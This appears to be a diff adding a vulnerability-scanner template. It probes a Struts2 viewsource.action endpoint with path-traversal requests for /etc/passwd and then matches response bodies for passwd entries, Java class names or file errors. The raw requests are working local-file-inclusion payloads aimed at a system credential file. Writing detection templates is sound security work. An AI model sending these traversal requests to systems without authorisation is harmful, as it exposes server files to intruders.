@@ -1,0 +1,44 @@
+id: struts2-viewsource-classname-page-probe
+
+info:
+  name: Struts2 ViewSource className/page logic probe
+  author: pentest-platform
+  severity: medium
+  description: Probes ViewSourceAction-like parameters className/page for potential file/path disclosure behavior.
+  tags: safe-poc,struts2,lfi,logic
+
+http:
+  - raw:
+      - |
+        GET /viewsource.action?className=../../../../../../etc/passwd&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /viewsource.action?className=java.lang.System&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /struts2-showcase/viewsource.action?className=../../../../../../etc/passwd&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+      - |
+        GET /struts2-showcase/viewsource.action?className=java.lang.System&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    stop-at-first-match: false
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:"
+          - "/bin/bash"
+      - type: regex
+        part: body
+        regex:
+          - "(?i)java\\.lang\\.[a-zA-Z0-9_$.]+"
+      - type: word
+        part: body
+        words:
+          - "FileNotFoundException"
+          - "No such file or directory"
